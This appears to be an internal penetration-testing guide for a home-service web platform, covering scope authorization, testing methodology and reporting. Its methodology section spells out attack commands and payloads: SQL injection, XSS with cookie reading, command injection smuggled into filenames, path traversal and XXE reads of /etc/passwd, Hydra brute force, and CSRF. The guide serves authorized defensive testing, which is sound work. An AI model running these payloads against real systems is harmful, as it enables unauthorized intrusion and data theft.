# Penetration Testing Guide

## Overview

This document provides guidelines for conducting penetration testing on the Home Service Platform. Penetration testing should be performed regularly to identify security vulnerabilities before malicious actors can exploit them.

## Testing Schedule

- **Internal Testing**: Quarterly
- **External Testing**: Annually (by certified third-party)
- **Post-Major Release**: After significant changes
- **Continuous**: Automated security scans (CI/CD)

## Pre-Testing Requirements

### Authorization

**IMPORTANT**: Always obtain written authorization before conducting penetration testing.

```
Authorization Checklist:
☐ Written approval from management
☐ Scope clearly defined
☐ Testing window scheduled
☐ Emergency contacts identified
☐ Non-Disclosure Agreement (NDA) signed
☐ Rules of engagement documented
```

### Testing Environment

- **Preferred**: Use staging/testing environment
- **Production**: Only with explicit approval and during maintenance window
- **Data**: Use anonymized/synthetic data when possible

### Notification

Notify the following teams before testing:
- Security team
- DevOps team
- On-call engineers
- Management

## Testing Methodology

We follow the OWASP Testing Guide and PTES (Penetration Testing Execution Standard).

### 1. Reconnaissance (Information Gathering)

#### Passive Reconnaissance
```bash
# DNS enumeration
dig homeservice.com ANY
nslookup -type=any homeservice.com
whois homeservice.com

# Search engine reconnaissance
# Google Dorks
site:homeservice.com
site:homeservice.com filetype:pdf
site:homeservice.com inurl:admin
site:homeservice.com intitle:"index of"

# Social media and public information
# LinkedIn, GitHub, etc.
```

#### Active Reconnaissance
```bash
# Network scanning
nmap -sV -sC homeservice.com
nmap -p- homeservice.com

# Subdomain enumeration
sublist3r -d homeservice.com
amass enum -d homeservice.com

# Technology fingerprinting
whatweb https://homeservice.com
wappalyzer
```

### 2. Scanning & Enumeration

#### Port Scanning
```bash
# Full TCP scan
nmap -sS -p- -T4 homeservice.com

# Service version detection
nmap -sV -p 80,443,8080 homeservice.com

# OS detection
sudo nmap -O homeservice.com
```

#### Web Application Scanning
```bash
# Nikto web server scanner
nikto -h https://homeservice.com

# Directory/file enumeration
gobuster dir -u https://homeservice.com -w /usr/share/wordlists/common.txt

# OWASP ZAP
zap-cli quick-scan --self-contained https://homeservice.com
```

### 3. Vulnerability Assessment

#### Authentication Testing

##### JWT Token Security
```bash
# Test JWT algorithm confusion
# Test JWT signature bypass
# Test token expiration
# Test refresh token security

# Tools
jwt_tool token.jwt -C -d jwt.txt
```

##### Password Policy Testing
```bash
# Test weak passwords
# Test password complexity requirements
# Test account lockout mechanism
# Test password reset functionality

# Common weak passwords to test (on test accounts only)
- password
- 123456
- admin123
- Password1
```

##### Brute Force Testing
```bash
# Rate limiting test
for i in {1..200}; do
  curl -X POST https://homeservice.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}'
  echo "Request $i"
done

# Hydra brute force (test accounts only)
hydra -l testuser@test.com -P passwords.txt https-post-form "/api/auth/login:email=^USER^&password=^PASS^:F=incorrect"
```

#### Authorization Testing

##### Vertical Privilege Escalation
```bash
# Test customer accessing admin endpoints
curl -X GET https://homeservice.com/api/admin/users \
  -H "Authorization: Bearer <customer_token>"

# Test provider accessing admin endpoints
curl -X GET https://homeservice.com/api/admin/analytics \
  -H "Authorization: Bearer <provider_token>"
```

##### Horizontal Privilege Escalation
```bash
# Test accessing other users' data
curl -X GET https://homeservice.com/api/bookings/{other_user_booking_id} \
  -H "Authorization: Bearer <your_token>"

# Test modifying other users' data
curl -X PUT https://homeservice.com/api/users/{other_user_id} \
  -H "Authorization: Bearer <your_token>" \
  -d '{"email":"hacked@test.com"}'
```

##### IDOR (Insecure Direct Object Reference)
```bash
# Test sequential ID enumeration
for id in {1..100}; do
  curl -X GET https://homeservice.com/api/users/$id \
    -H "Authorization: Bearer <token>"
done

# Test UUID predictability
# Test object ownership validation
```

#### Input Validation Testing

##### SQL Injection
```bash
# Test in login form
curl -X POST https://homeservice.com/api/auth/login \
  -d "email=admin' OR '1'='1&password=test"

# Test in search
curl -X GET "https://homeservice.com/api/services?search=test' UNION SELECT NULL--"

# Automated testing
sqlmap -u "https://homeservice.com/api/services?search=test" --cookie="token=xxx"
```

##### XSS (Cross-Site Scripting)
```bash
# Reflected XSS
curl "https://homeservice.com/api/search?q=<script>alert('XSS')</script>"

# Stored XSS (in review comments)
curl -X POST https://homeservice.com/api/reviews \
  -H "Authorization: Bearer <token>" \
  -d '{"comment":"<script>alert(document.cookie)</script>"}'

# DOM-based XSS (check frontend)
```

##### Command Injection
```bash
# Test file upload
curl -X POST https://homeservice.com/api/files/upload \
  -F "file=@test.jpg;filename=test.jpg;sleep 10;"

# Test in parameters
curl "https://homeservice.com/api/export?filename=test;ls -la"
```

##### Path Traversal
```bash
# Test file download
curl "https://homeservice.com/api/files/download?path=../../../../etc/passwd"
curl "https://homeservice.com/api/files/download?path=..%2F..%2F..%2Fetc%2Fpasswd"
```

##### XXE (XML External Entity)
```xml
<!-- Test if XML parsing is vulnerable -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

#### Session Management Testing

##### Session Fixation
```bash
# Test if session ID changes after login
# Test if old session ID is invalidated
```

##### Session Timeout
```bash
# Test idle timeout (should be 60 minutes)
# Test absolute timeout
# Test concurrent session handling
```

##### CSRF (Cross-Site Request Forgery)
```html
<!-- Test CSRF protection -->
<form action="https://homeservice.com/api/bookings" method="POST">
  <input type="hidden" name="serviceId" value="123">
  <input type="hidden" name="date" value="2024-01-01">
</form>
<script>document.forms[0].submit();</script>
```

#### API Security Testing

##### Rate Limiting
```bash
# Test general endpoints
ab -n 1000 -c 10 https://homeservice.com/api/services

# Test authentication endpoints
ab -n 100 -c 5 -p login.json -T application/json \
  https://homeservice.com/api/auth/login
```

##### Mass Assignment
```bash
# Test adding unauthorized fields
curl -X POST https://homeservice.com/api/users \
  -H "Authorization: Bearer <token>" \
  -d '{"email":"test@test.com","role":"Admin","isVerified":true}'
```

##### API Versioning
```bash
# Test old API versions for vulnerabilities
curl https://homeservice.com/api/v1/users
curl https://homeservice.com/api/v2/users
```

### 4. Exploitation (Controlled)

**IMPORTANT**: Only exploit vulnerabilities in a controlled manner and with authorization.

#### Tools
- **Metasploit**: Exploitation framework
- **Burp Suite Pro**: Web application testing
- **OWASP ZAP**: Automated scanning
- **SQLMap**: SQL injection testing
- **John the Ripper**: Password cracking
- **Hashcat**: Password cracking

### 5. Post-Exploitation

#### Data Access Testing
```bash
# Test what data can be accessed
# Test data exfiltration paths
# Test lateral movement possibilities
```

#### Privilege Maintenance
```bash
# Test if backdoors can be created
# Test if access persists after logout
# Test if tokens remain valid after password change
```

### 6. Reporting

#### Vulnerability Classification

**Critical** (CVSS 9.0-10.0)
- Remote code execution
- Authentication bypass
- SQL injection with data access
- Unauthorized admin access

**High** (CVSS 7.0-8.9)
- Privilege escalation
- Sensitive data exposure
- XSS with session theft
- SSRF with internal access

**Medium** (CVSS 4.0-6.9)
- CSRF
- Information disclosure
- Weak password policy
- Missing security headers

**Low** (CVSS 0.1-3.9)
- Verbose error messages
- Missing best practices
- Information leakage

#### Report Template

```markdown
# Penetration Testing Report

## Executive Summary
- Testing period: [dates]
- Tester: [name/company]
- Scope: [URLs/IP ranges]
- Methodology: OWASP + PTES

## Findings Summary
- Critical: X
- High: Y
- Medium: Z
- Low: W

## Critical Findings

### [Vulnerability Name]
**Severity**: Critical
**CVSS Score**: 9.5
**Affected Component**: /api/users
**Description**: [Detailed description]
**Impact**: [Business impact]
**Reproduction Steps**:
1. Step 1
2. Step 2
**Proof of Concept**: [Code/screenshots]
**Remediation**: [Fix recommendation]
**References**: [CVE, CWE, etc.]

## Recommendations
1. [Priority 1 fix]
2. [Priority 2 fix]

## Conclusion
[Overall security posture assessment]
```

## Automated Testing Tools

### Continuous Security Testing

```yaml
# GitHub Actions - Security Scan
name: Security Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run OWASP ZAP
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.homeservice.com'
```

### Recommended Tools

| Tool | Purpose | License |
|------|---------|---------|
| OWASP ZAP | Web app scanner | Free |
| Burp Suite | Web app testing | Free/Pro |
| Nmap | Network scanner | Free |
| SQLMap | SQL injection | Free |
| Nikto | Web server scanner | Free |
| Metasploit | Exploitation | Free/Pro |
| Wireshark | Network analysis | Free |
| John the Ripper | Password cracking | Free |
| Hydra | Brute force | Free |
| Dirb/Gobuster | Directory bruteforce | Free |

## Compliance Testing

### OWASP Top 10 (2021)

1. **A01:2021 - Broken Access Control**
   - Test IDOR vulnerabilities
   - Test privilege escalation
   - Test missing authorization

2. **A02:2021 - Cryptographic Failures**
   - Test TLS configuration
   - Test encryption at rest
   - Test weak cryptography

3. **A03:2021 - Injection**
   - Test SQL injection
   - Test command injection
   - Test LDAP injection

4. **A04:2021 - Insecure Design**
   - Review architecture
   - Test business logic flaws
   - Test rate limiting

5. **A05:2021 - Security Misconfiguration**
   - Test default credentials
   - Test verbose errors
   - Test security headers

6. **A06:2021 - Vulnerable Components**
   - Scan dependencies
   - Check for known CVEs
   - Test outdated libraries

7. **A07:2021 - Authentication Failures**
   - Test authentication bypass
   - Test session management
   - Test MFA implementation

8. **A08:2021 - Data Integrity Failures**
   - Test unsigned tokens
   - Test insecure deserialization
   - Test integrity checks

9. **A09:2021 - Logging Failures**
   - Test logging coverage
   - Test log tampering
   - Test monitoring alerts

10. **A10:2021 - SSRF**
    - Test URL validation
    - Test internal network access
    - Test metadata endpoints

## Post-Testing Actions

1. **Immediate**
   - Report critical findings
   - Patch critical vulnerabilities
   - Document all findings

2. **Short-term (1 week)**
   - Fix high-priority issues
   - Implement quick wins
   - Update security controls

3. **Medium-term (1 month)**
   - Address medium-priority issues
   - Conduct code review
   - Update security policies

4. **Long-term (3 months)**
   - Fix low-priority issues
   - Implement security training
   - Schedule next test

## Legal and Ethical Considerations

### Rules of Engagement

- Test only authorized systems
- Do not access/modify customer data
- Do not disrupt service availability
- Report findings responsibly
- Maintain confidentiality
- Stop immediately if legal concerns arise

### Responsible Disclosure

If external researchers find vulnerabilities:
- Email: security@homeservice.com
- Provide 90 days for patching
- Do not publicly disclose before patch
- Credit researchers appropriately

## Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [Bug Bounty Platforms](https://www.bugcrowd.com/)
